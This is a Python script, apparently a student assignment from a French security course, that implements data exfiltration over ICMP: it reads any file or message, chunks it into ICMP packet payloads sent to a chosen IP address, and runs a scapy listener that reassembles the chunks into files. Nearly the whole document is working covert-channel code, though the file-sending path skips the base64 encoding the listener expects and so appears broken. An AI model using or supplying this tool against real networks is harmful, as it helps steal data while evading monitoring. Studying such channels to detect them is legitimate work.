#!/usr/bin/env python3

#Copyright : Daniel ZEITOUN
#Classe    : ESGI - 5ème année - Sécurité Informatique - Groupe 2 (5SI2)

#-------------------------------------------------------------------------------------------------------------------------#
import argparse
import base64
from scapy.all import *
from time import sleep
from math import ceil
import ast
#-------------------------------------------------------------------------------------------------------------------------#
#Liste pour retenir les fichiers en cours d'envoi
list_files = list()
#-------------------------------------------------------------------------------------------------------------------------#
#Fonction principale
def main():
	if len(sys.argv) < 2:
		sys.argv.append("--help")

	args = parse()

	if args.which == "main":
		if args.list == True:
			if sys.platform == "win32":
				print(IFACES)
			elif sys.platform == "linux":
				print(conf.route)

	elif args.which == "send":
		if args.data:
			send_msg(args.to, args.data, args.size, args.wait)

		elif args.file:
			send_file(args.to, args.file, args.size, args.wait)

	elif args.which == "listen":
		sniff(iface=args.interface, filter="icmp", prn=listen_callback, timeout=args.timeout, count=args.count)
#-------------------------------------------------------------------------------------------------------------------------#
#Fonction pour parser les arguments en ligne de commande
def parse():
	parser = argparse.ArgumentParser(description="Script that allows data exfiltration via ICMP")
	parser.set_defaults(which="main")
	parser.add_argument("-l", "--list", action="store_true", help="displays the list available interfaces")

	subparsers = parser.add_subparsers()

	parser_send = subparsers.add_parser("send", description="Sending mode")
	parser_send.set_defaults(which="send")

	parser_listen = subparsers.add_parser("listen", description="Listening mode")
	parser_listen.set_defaults(which="listen")
	
	parser_send.add_argument("-t", "--to", type=str, default="127.0.0.1", help="destination IPv4 address")
	parser_send.add_argument("-s", "--size", type=int, default=200, help="max size of payload of each packet")
	parser_send.add_argument("-w", "--wait", type=float, default=0, help="decimal number of seconds to wait between each packet")
	groupSend = parser_send.add_mutually_exclusive_group(required=True)
	groupSend.add_argument("-d", "--data", type=str, help="payload to send")
	groupSend.add_argument("-f", "--file", type=str, help="name of the file to send")

	parser_listen.add_argument("-i", "--interface", type=str, required=True, help="interface on which to listen")
	parser_listen.add_argument("-t", "--timeout", type=int, help="time in seconds after which the listening stops")
	parser_listen.add_argument("-c", "--count", type=int, default=0, help="number of ICMP packet after which the listening stops")

	args = parser.parse_args()
	return args
#-------------------------------------------------------------------------------------------------------------------------#
#Fonction pour envoyer des données avec --data
def send_msg(to, data, size, wait):
	try:
		timestamp = time.time()
		for i in range(0, ceil(len(data) / size)):
			bytesSent = i * size
			srting_proto = str({"TIMESTAMP":timestamp, "DATATYPE":"data", "SEGMENT_NUMBER": i + 1, "NUMBER_OF_SEGMENTS": ceil(len(data) / size), "DATA":data[bytesSent:bytesSent + size]})
			segment = base64_encode(srting_proto)
			packet = IP(dst = to)/ICMP()/segment
			send(packet, verbose=False)
			print("Sending to {} segment {} on {} of \"{}\"".format(to, i + 1, ceil(len(data) / size), data))
			sleep(wait)
	except:
		print("Error while sending data \"{}\"".format(data))
#-------------------------------------------------------------------------------------------------------------------------#
#Fonction pour envoyer un fichier avec --file
def send_file(to, filename, size, wait):

	try:
		#On parse filename pour enlever Les "/"" et "\""
		filenameShort = filename.split("/")[-1].split("\\")[-1]

		with open(filename, "rb") as file:
			data = file.read()
		try:
			timestamp = time.time()
			for i in range(0, ceil(len(data) / size)):
				bytesSent = i * size
				srting_proto = str({"TIMESTAMP":timestamp, "DATATYPE":"file", "FILENAME":filenameShort, "SEGMENT_NUMBER": i + 1, "NUMBER_OF_SEGMENTS": ceil(len(data) / size), "DATA":data[bytesSent:bytesSent + size]})
				segment = srting_proto #base64_encode(srting_proto)
				packet = IP(dst = to)/ICMP()/segment
				send(packet, verbose=False)
				print("Sending to {} segment {} on {} of file {}".format(to, i + 1, ceil(len(data) / size), filename))
				sleep(wait)
		except:
			print("Error while sending data from the file")
	except:
		print("Error while opening file {}".format(filename))
#-------------------------------------------------------------------------------------------------------------------------#
#Fonction de récèption des données
def listen_callback(packet):
	try:
		string_payload = base64_decode(packet[ICMP][Raw]).decode("UTF-8")
		proto = ast.literal_eval(string_payload)

		if proto["DATATYPE"] == "data":
			print("--------------------------------------")
			print("Data received from {}".format(packet[IP].src))
			print("Segement : {} on {}".format(proto["SEGMENT_NUMBER"], proto["NUMBER_OF_SEGMENTS"]))
			print("DATA : {}".format(proto["DATA"]))
			print("--------------------------------------")

		elif proto["DATATYPE"] == "file":

			for i, dico in enumerate(list_files):
				if proto["TIMESTAMP"] == dico["TIMESTAMP"]:

					#Si c'est le dernier segement et qu'il y'a LAST
					if proto["SEGMENT_NUMBER"] == dico["SEGMENT_NUMBER"] and dico["LAST"] == True:
						#print("Deleting file's informations for {}".format(str(proto["TIMESTAMP"]) + "_" + proto["FILENAME"]))
						del list_files[i]
						return
					#Si c'est le dernier segement et qu'il n y'a pas LAST
					if proto["SEGMENT_NUMBER"] == dico["SEGMENT_NUMBER"] and dico["LAST"] == False:
						return
					#Si c'est le segement suivant
					elif proto["SEGMENT_NUMBER"] == dico["SEGMENT_NUMBER"] + 1:
						file_received(packet[IP].src, proto["FILENAME"], proto["TIMESTAMP"], proto["DATA"], proto["SEGMENT_NUMBER"], proto["NUMBER_OF_SEGMENTS"])
						dico["SEGMENT_NUMBER"] += 1

						#Si c'est le dernier on met LAST à True
						if proto["SEGMENT_NUMBER"] == proto["NUMBER_OF_SEGMENTS"]:
							dico["LAST"] = True
							return
						return
					return

			#Si c'est le premier segement
			if proto["SEGMENT_NUMBER"] == 1:
				proto_for_list = {"TIMESTAMP":proto["TIMESTAMP"], "FILENAME":proto["FILENAME"], "SEGMENT_NUMBER":proto["SEGMENT_NUMBER"], "NUMBER_OF_SEGMENTS":proto["NUMBER_OF_SEGMENTS"], "LAST":False}
				list_files.append(proto_for_list)
				file_received(packet[IP].src, proto["FILENAME"], proto["TIMESTAMP"], proto["DATA"], proto["SEGMENT_NUMBER"], proto["NUMBER_OF_SEGMENTS"])
		else:
			print("Error : unrecognized payload")
	except:
		print("Error while listening")
#-------------------------------------------------------------------------------------------------------------------------#
#Fonction pour écrire dans le fichier à la récèption des données
def file_received(src, filename, timestamp, data, segment_number, number_of_segments):
	print("--------------------------------------")
	print("Data received from {}".format(src))
	print("file name : {} -> {}".format(filename, str(timestamp) + "_" + filename))
	print("Segement : {} on {}".format(segment_number, number_of_segments))

	with open(str(timestamp) + "_" + filename, "ab") as file:
		file.write(data)
	print("--------------------------------------")
#-------------------------------------------------------------------------------------------------------------------------#
def base64_encode(input):
	if type(input) == str:
		input = input.encode()

	if type(input) == bytes:
		base64_encoded_data = base64.b64encode(input)
		base64_message = base64_encoded_data.decode("utf-8")
		return base64_message
#-------------------------------------------------------------------------------------------------------------------------#
def base64_decode(input):
	input = bytes(input)
	output = base64.decodebytes(input)
	return output
#-------------------------------------------------------------------------------------------------------------------------#
if __name__ == '__main__':
	main()
#-------------------------------------------------------------------------------------------------------------------------#